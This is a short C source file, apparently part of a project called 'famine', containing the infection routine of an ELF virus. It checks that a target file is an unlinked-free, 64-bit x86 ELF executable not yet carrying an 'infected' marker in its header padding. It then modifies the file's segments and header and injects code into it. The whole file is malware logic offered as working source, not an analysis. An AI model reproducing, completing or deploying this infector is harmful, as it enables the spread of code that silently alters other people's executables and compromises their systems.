#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline Elf64_Ehdr *get_header(struct s_info *info)
{
	Elf64_Ehdr *header;
	
	header = (Elf64_Ehdr *)info->ptr;

	if (info->ptr + sizeof(Elf64_Ehdr) >= info->ptr + info->size)
		header = NULL;

	return header;
}

static inline bool is_elf(const Elf64_Ehdr *header)
{
	return *(unsigned int *)header == ELF_MAGIC_NUMBER;
}

static inline bool is_x86(const Elf64_Ehdr *header)
{
	return header->e_ident[EI_CLASS] == X86_64;
}

static inline bool is_linked(const Elf64_Ehdr *header)
{
	return header->e_entry != 0;
}

static inline bool is_not_infected(const Elf64_Ehdr *header)
{
	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

static inline void defer(struct s_info *info)
{
	release_info(info);
}

void famine(const char *file, const size_t m_entry)
{
	__attribute__((cleanup(defer))) struct s_info info;
	Elf64_Ehdr *header;
	const struct criteria crit[] =
	{
		(const struct criteria){&is_elf},
		(const struct criteria){&is_x86},
		(const struct criteria){&is_linked},
		(const struct criteria){&is_not_infected},
	};

	if ((info = get_info(file)).name == NULL)
		return ;
	if ((header = get_header(&info)) == NULL)
		return ;

	for (uint8_t index = 0; index < CRITERIA_SIZE; index++)
	{
		if (crit[index].fct(header) == false)
			return ;
	}

	modify_segment(&info);
	modify_header(&info, header);	
	inject(&info, m_entry);
}
